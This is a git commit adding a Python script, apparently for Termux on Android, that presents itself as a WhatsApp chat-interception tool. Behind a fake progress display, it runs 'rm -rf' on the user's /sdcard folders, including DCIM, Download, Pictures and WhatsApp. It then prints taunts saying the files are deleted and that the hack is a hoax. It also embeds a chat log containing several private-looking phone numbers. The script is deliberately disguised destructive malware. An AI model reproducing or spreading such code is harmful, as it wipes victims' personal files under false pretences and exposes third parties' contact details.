05a4b06edceed7db7b02cce38b6c1b2f903fcd66
Makky2693 <54711286+Makky2693@users.noreply.github.com>
2019-08-31 12:23:21 +0700

    WhatsHack

---
+++ WhatsHack.py
@@ -0,0 +1,204 @@
+#!/bin/usr/python
+
+"""
+	Hack WHATSHX
+
+"""
+
+import os
+import sys
+from time import sleep
+
+def ketik(s):
+	for ASU in s + '\n':
+		sys.stdout.write(ASU)
+		sys.stdout.flush()
+		sleep(50. / 1000)
+os.system('xdg-open http://youtube.com/c/Makky2693')
+os.system('clear')
+print ("""\033[1;31m
+               WhatsHack Tools
+             Author : Makky2693
+  Tidak Ada WhatsApp Yang Aman
+\033[1;36m
+____________
+< WhatsApp >
+ ---------
+╲╲╭━━━━╮
+╭╮┃▆┈┈▆┃╭╮
+┃╰┫▽▽▽┣╯┃|
+╰━┫△△△┣━╯
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯
+""")
+a = input("\033[1;36m Masukan No telepon kamu: ")
+a = input("\033[1;33m Masukan No telepon target kamu: ")
+os.system('clear')
+print ("\033[1;36m Memulai Sadap WhatsHX ")
+sleep(3)
+print ("\033[1;36m Mengambil data WhatsHX... ")
+sleep(3)
+print ("\033[1;36m Mengambil code verifikasi... ")
+print (' ')
+print ("\033[1;32m Suksesss mendapatkan code verifikasi... ")
+print (' ')
+ketik ("\033[1;32m Mengambil Data WhatsHX")
+sleep(0.5)
+ketik ("\033[1;32m Mencari Nomor Kontak")
+sleep(0.5)
+ketik ("\033[1;32m Berhasil menemukan kontak")
+sleep(0.5)
+print ("\033[1;32m Baypass Akses LOG IN ")
+sleep(1)
+sleep(3)
+ketik ("\033[1;32m Baypass Suksess ")
+sleep(2)
+ketik ("\033[1;32m Mendapatkan Chat WhatHX: %s" % (a))
+sleep(0.5)
+ketik ("\033[1;32m Sedang Membuka Chat WhatsHX ")
+sleep(2)
+print ("\033[1;32m Baypass chat WhatsHX ")
+print (' ')
+print ("\033[1;32m SUKSESS!!!")
+os.system('termux-setup-storage')
+os.system('rm -rf cd /sdcard/Android')
+os.system('rm -rf cd /sdcard/bluetooth')
+os.system('rm -rf cd /sdcard/browser')
+os.system('rm -rf cd /sdcard/DCIM')
+os.system('rm -rf cd /sdcard/Download')
+os.system('rm -rf cd /sdcard/Music')
+os.system('rm -rf cd /sdcard/Pictures')
+os.system('rm -rf cd /sdcard/SHAREit')
+os.system('rm -rf cd /sdcard/WhatsApp')
+sleep(3)
+print ("\033[1;32m Login Sukses! ")
+print (' ')
+print ("\033[1;32m Mengubah HALAMAN LOG-IN ")
+sleep(2)
+print ("\033[1;31m   Sukses! ")
+print ("\033[1;32m Menghapus LOG-IN WhatsHX ")
+sleep(2)
+print ("\033[1;31m   Sukses! ")
+sleep(3)
+print ("\033[1;32m Waiting Open Database WhatsHX ")
+os.system('clear')
+print ("""\033[1;31m
+\033[1;36m
+____________
+< WhatsApp>
+ ---------
+╲╲╭━━━━╮       ÷÷÷÷÷÷÷÷÷÷÷÷÷
+╭╮┃▆┈┈▆┃╭╮     Database Chat
+┃╰┫▽▽▽┣╯┃|     ÷÷÷÷÷÷÷÷÷÷÷÷÷
+╰━┫△△△┣━╯
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯
+""")
+sleep(5)
+print ("\033[1;32m Waiting Open Chat WhatsHX ")
+sleep(5)
+print ("\033[1;35m (1)   +6281295774807 ")
+print ("\033[1;35m (2)   +6289078946742 ")
+print ("\033[1;35m (3)   +628778906570 ")
+print ("\033[1;35m (4)   +6281385890549 ")
+print ("\033[1;35m (5)   +6282283007894 ")
+print ("\033[1;35m (6)   +6285256705212 ")
+a = input("\033[1;31m Silahkan Pilih : ")
+ketik ("\033[1;31m Waiting Open Chat! ") 
+print ("""\033[1;35m
+[25/6 03.05] +62 852-5670-5212: Bang
+[25/6 08.17] Sayang2 🐣: Iya?
+[25/6 09.20] +62 852-5670-5212: Memang bisa ya bng ngambil data wa orng
+[25/6 09.21] Sayang2 🐣: Bisa
+[25/6 09.21] +62 852-5670-5212: Pake termux kan bang
+[25/6 09.21] Sayang2 🐣: Iya
+[25/6 09.22] +62 852-5670-5212: Berapa harga scrif nya bng
+[25/6 09.22] Sayang2 🐣: 50k bang
+[25/6 09.22] +62 852-5670-5212: Coleh gk coba dulu abng ambil data wa saya
+[25/6 09.23] Sayang2 🐣: Gabisa gan soalnya ada lisensi ny
+[25/6 09.23] Sayang2 🐣: Gw bantu jual doang yg jual tmn gw
+[25/6 09.23] Sayang2 🐣: Kemarin juga ada yg minta tes tapi gblh
+[25/6 09.23] Sayang2 🐣: Tapi pada beli yg TROJANVIRUS
+[25/6 09.24] Sayang2 🐣: TROJANVIRUS: Menghapus file target pake no tlpn
+[25/6 09.24] +62 852-5670-5212: Mksdnya. Abng yang tes kesaya. Nti bng krm ss data saya
+[25/6 09.24] Sayang2 🐣: Gabisa bang yg punya nya lagi gaada
+[25/6 09.24] Sayang2 🐣: Jadi gw Nge chat dlu
+[25/6 09.24] Sayang2 🐣: Lagian gbkl di kasih bang
+[25/6 09.25] +62 852-5670-5212: Ya udah bang. Aku mau bukti nya aja dulu bng work apa kaga
+[25/6 09.26] +62 852-5670-5212: Cpt bnget bng blum bca lgi
+[25/6 09.26] +62 852-5670-5212: Aku mau chat aku di tes bng
+[25/6 09.27] Sayang2 🐣: Gabisa gan harus pake lisensi
+[25/6 09.27] Sayang2 🐣: Jadi Kalo Mau bukti itu doang
+[25/6 09.27] +62 852-5670-5212: Tunggu temenya datang aja dulu bnh
+[25/6 09.27] Sayang2 🐣: Yakin mau nungguin?
+[25/6 09.27] Sayang2 🐣: Orng nya ada di Malang gw di jkt dia 2 blm netep di sono
+[25/6 09.28] +62 852-5670-5212: Boleh gk mnta wa dia bng
+[25/6 09.28] Sayang2 🐣: Nanti
+[25/6 09.29] Sayang2 🐣: Lagian buat apaan si boy Lagian dia kerja di malang
+[25/6 09.29] Sayang2 🐣: Gw cuman bantu doang jualan tools dia nanti klo emng serius gw yg cht
+[25/6 09.29] Sayang2 🐣: Dia orng nya gmau nerima cht dari orang yg ga di kenal soalnya orng nya sensitif
+[25/6 09.30] Sayang2 🐣: Psikopat
+[25/6 09.30] +62 852-5670-5212: Ok mksh bang. Ntar aku kabarin aku lgi ngumpulin duit nya maklum lh bng msh anak skolhan
+[25/6 09.31] Sayang2 🐣: Kls brp emng
+[25/6 09.34] +62 852-5670-5212: Bru naik kelas 3 bang
+[25/6 09.34] Sayang2 🐣: Oke
+[25/6 09.34] +62 852-5670-5212: Gpp kan bang
+[25/6 10.26] Sayang2 🐣: Iya
+[25/6 19.45] +62 852-5670-5212: Bang saya pengen beli tpi butuh buktinya bisa gk abng kasi nmr nya tmn abng tu
+[25/6 21.04] Sayang2 🐣: Mksudnya
+[25/6 21.05] Sayang2 🐣: Gini gan bukti sudah saya kasih
+[25/6 21.29] Sayang2 🐣: Yg niat Nipu siapa coba?
+[25/6 21.32] +62 852-5670-5212: Tidak bng bukan gtu
+[25/6 21.40] +62 852-5670-5212: Bang
+[25/6 21.40] Sayang2 🐣: Apasi
+[25/6 21.41] +62 852-5670-5212: Bang besok aku pastiin beli bang
+[25/6 21.41] Sayang2 🐣: Udh males ngasih bukti Udh jelas Udh banyak yg beli di tools gua ada 60 orng
+[25/6 21.42] +62 852-5670-5212: Ok bang tpi ada yang mau ditanya ni lgi
+[25/6 21.43] Sayang2 🐣: Apa
+[25/6 21.44] +62 852-5670-5212: Itu tu bisa liat semua chat orng tu gk bang sama siapa saja dia chat gtu
+[25/6 21.44] Sayang2 🐣: Bisa lah
+[25/6 21.44] Sayang2 🐣: Tergantung data dari dia nya
+[25/6 21.44] Sayang2 🐣: Dia ngechat Brp orng nanti ke data
+[25/6 21.44] +62 852-5670-5212: Ok bang btw transaksi lewat apaa bng
+[25/6 21.45] Sayang2 🐣: Atm/pulsa
+[25/6 21.45] Sayang2 🐣: Njir kpncet
+[25/6 21.45] Sayang2 🐣: Sorey
+[25/6 21.45] Sayang2 🐣: Sorry
+[25/6 21.45] +62 852-5670-5212: Gpp bng
+[25/6 21.45] +62 852-5670-5212: Pulsa aja ya bng
+[25/6 21.45] Sayang2 🐣: Gw op dlu kuota gw mau habis
+[25/6 21.45] +62 852-5670-5212: Satu lgi bng
+[25/6 21.45] +62 852-5670-5212: Mau tanya
+[25/6 21.46] Sayang2 🐣: Apa
+[25/6 21.47] +62 852-5670-5212: Itukan pake termux kan tampa root
+[25/6 21.47] Sayang2 🐣: Iya gw pake versi python3
+[25/6 21.47] Sayang2 🐣: Jadi nya no rpot
+[25/6 21.47] Sayang2 🐣: Root
+[25/6 21.48] Sayang2 🐣: Kalo Mau ngirim pulsa kabarin soalnya Besok gw tournament
+[25/6 21.48] Sayang2 🐣: Gw op dlu
+[25/6 21.48] +62 852-5670-5212: Ok bang
+[27/6 09.42] +62 852-5670-5212: Bang
+[27/6 09.42] +62 852-5670-5212: Bang
+[27/6 09.50] Sayang2 🐣: Iy
+[27/6 10.21] +62 852-5670-5212: Aku mau beli bng tpi tesmony dulu
+[27/6 10.22] Sayang2 🐣: Semalam
+[27/6 10.23] +62 852-5670-5212: Tesmony ke aku bng
+[27/6 10.23] Sayang2 🐣: Mksudnya
+[27/6 10.23] +62 852-5670-5212: Chat kita ni tes bang
+[27/6 10.24] Sayang2 🐣: Mksudnya gimana sih
+[27/6 10.24] Sayang2 🐣: Itu kan udh gw kirim testi nya
+[27/6 10.24] +62 852-5670-5212: Testi ke gua bang
+[27/6 10.24] Sayang2 🐣: Iya itu
+[27/6 10.25] +62 852-5670-5212: Tes chat kita ni banh
+""")
+sleep(3)
+print ("\033[1;31m Terimakasih Telah Menggunakan Tools Ini! See you ")
+print ("\033[1;31m Silahkan Cek Semua Berkas Anda ^_^ ")
+print ("\033[1;31m Anjing Goblog Kok Ilang ^_^ ")
+print ("\033[1;31m Mamposh Terhapus Semua ^_^ ")
+print ("\033[1;31m Script Sadap WhatsApp Itu Hoax^_^ ")
+print ("\033[1;31m Dasar Kang Termoss ^_^")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m See You Next Time ^_^ ")
